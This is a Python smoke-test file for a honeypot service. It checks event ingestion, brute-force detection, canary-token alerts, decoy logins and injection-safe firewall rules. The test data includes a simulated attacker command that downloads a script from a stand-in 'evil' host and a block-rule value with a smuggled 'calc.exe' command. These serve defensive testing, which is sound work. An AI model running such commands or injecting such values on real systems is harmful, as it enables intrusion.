"""Smoke tests against a RUNNING stack (docker compose up). Run: python tests/test_smoke.py"""
import json
import secrets
import sys
import urllib.error
import urllib.parse
import urllib.request

API = "http://127.0.0.1:8000"
WEB = "http://127.0.0.1:8081"
KEY = "trap-demo-key"


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None


def call(method, url, body=None, headers=None, raw=False):
    h = {"Content-Type": "application/json"} if body is not None and not raw else {}
    h.update(headers or {})
    data = (body if raw else json.dumps(body).encode()) if body is not None else None
    req = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        r = urllib.request.build_opener(NoRedirect).open(req, timeout=8)
        return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()


def test_health():
    s, b = call("GET", API + "/health")
    assert s == 200 and json.loads(b)["ok"]


def test_event_requires_key_and_is_stored():
    sid = "test-" + secrets.token_hex(4)
    ev = {"session_id": sid, "src_ip": "198.51.100.9", "service": "web", "kind": "request",
          "detail": {"path": "/x", "method": "GET"}}
    s, _ = call("POST", API + "/events", ev)
    assert s == 401, "events must require the trap key"
    s, _ = call("POST", API + "/events", ev, {"X-Trap-Key": KEY})
    assert s == 200
    s, b = call("GET", API + "/sessions/" + sid)
    d = json.loads(b)
    assert s == 200 and len(d["events"]) == 1 and d["events"][0]["detail"]["path"] == "/x"


def test_bruteforce_detected_after_three_failures():
    sid = "test-" + secrets.token_hex(4)
    for i in range(3):
        call("POST", API + "/events", {"session_id": sid, "src_ip": "198.51.100.10", "service": "web",
             "kind": "login_attempt", "detail": {"username": "x", "password": str(i), "success": False}},
             {"X-Trap-Key": KEY})
    kinds = [e["kind"] for e in json.loads(call("GET", API + "/sessions/" + sid)[1])["events"]]
    assert "bruteforce_detected" in kinds


def test_suspicious_command_is_upgraded():
    sid = "test-" + secrets.token_hex(4)
    call("POST", API + "/events", {"session_id": sid, "src_ip": "198.51.100.11", "service": "ssh",
         "kind": "command", "detail": {"cmd": "wget http://evil/x.sh"}}, {"X-Trap-Key": KEY})
    e = json.loads(call("GET", API + "/sessions/" + sid)[1])["events"][0]
    assert e["kind"] == "suspicious_command" and e["severity"] == "high"


def test_canary_raises_critical():
    sid, tok = "test-" + secrets.token_hex(4), secrets.token_urlsafe(10)
    call("POST", API + "/events", {"session_id": sid, "src_ip": "198.51.100.12", "service": "web",
         "kind": "bait_downloaded", "detail": {}}, {"X-Trap-Key": KEY})
    s, _ = call("POST", API + "/canary", {"token": tok, "session_id": sid}, {"X-Trap-Key": KEY})
    assert s == 200
    s, _ = call("GET", API + "/c/" + tok)
    assert s == 404  # boring response by design
    d = json.loads(call("GET", API + "/sessions/" + sid)[1])
    assert any(e["kind"] == "canary_triggered" and e["severity"] == "critical" for e in d["events"])
    assert d["session"]["risk_level"] == "CRITICAL"


def test_unknown_canary_token_does_nothing():
    before = json.loads(call("GET", API + "/stats")[1])["critical"]
    call("GET", API + "/c/" + secrets.token_urlsafe(10))
    assert json.loads(call("GET", API + "/stats")[1])["critical"] == before


def test_block_rule_contains_ip_and_is_injection_safe():
    s, b = call("POST", API + "/block-rule", {"ip": "203.0.113.77"})
    assert s == 200 and "203.0.113.77" in b and "netsh" in b and "iptables" in b and "ufw" in b
    s, _ = call("POST", API + "/block-rule", {"ip": "1.2.3.4; calc.exe"})
    assert s == 400


def test_web_decoy_login_and_bait():
    ua = {"User-Agent": "smoke-test", "X-Forwarded-For": "198.51.100." + str(secrets.randbelow(200) + 20)}
    s, _ = call("GET", WEB + "/login", headers=ua)
    assert s == 200
    form = lambda u, p: urllib.parse.urlencode({"username": u, "password": p}).encode()
    s, _ = call("POST", WEB + "/login", form("root", "toor"),
                {**ua, "Content-Type": "application/x-www-form-urlencoded"}, raw=True)
    assert s == 401
    s, _ = call("POST", WEB + "/login", form("admin", "admin123"),
                {**ua, "Content-Type": "application/x-www-form-urlencoded"}, raw=True)
    assert s in (302, 303)
    s, b = call("GET", WEB + "/download/passwords_backup.txt", headers=ua)
    assert s == 200 and "/c/" in b, "bait must embed a canary URL"


if __name__ == "__main__":
    failed = 0
    for name, fn in sorted(globals().items()):
        if name.startswith("test_") and callable(fn):
            try:
                fn(); print("PASS", name)
            except Exception as e:
                failed += 1; print("FAIL", name, "->", repr(e))
    sys.exit(1 if failed else 0)
